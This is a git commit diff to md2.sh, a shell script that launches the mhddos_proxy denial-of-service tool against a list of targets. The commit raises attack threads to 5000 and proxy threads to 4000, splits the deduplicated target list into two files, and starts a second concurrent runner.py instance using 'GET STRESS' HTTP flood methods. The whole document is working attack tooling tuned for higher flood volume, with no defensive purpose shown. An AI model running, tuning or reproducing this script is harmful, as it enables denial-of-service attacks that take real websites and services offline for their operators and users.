f3c28aeb9bf92462a86065aa3928fd28f2dfe8a7
ripper <mls@gmail.com>
2022-05-25 12:37:13 +0300

    proxy threads 4000; 2 copies

--- md2.sh
+++ md2.sh
@@ -35,11 +35,11 @@ if [[ $docker_mode != "true" ]]; then
 fi
 
 if [[ $t_set_manual != "on" ]]; then
-    export threads="-t 2500"
+    export threads="-t 5000"
 fi
 
 if [[ $t_proxy_manual != "on" ]]; then
-    export proxy_threads="2000"
+    export proxy_threads="4000"
 fi
 
 export methods="--http-methods GET STRESS"
@@ -74,7 +74,7 @@ cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
 
 #split targets by line in N files
 cd /var/tmp/
-split -n l/1 --additional-suffix=.uaripper $targets_uniq
+split -n l/2 --additional-suffix=.uaripper $targets_uniq
 cd -
 
 # Print greetings and number of targets (secondary, main, total)
@@ -215,8 +215,8 @@ fi
 while true; do
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
-        # sleep 10 # to decrease load on cpu during simultaneous start
-        # python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
+        sleep 10 # to decrease load on cpu during simultaneous start
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
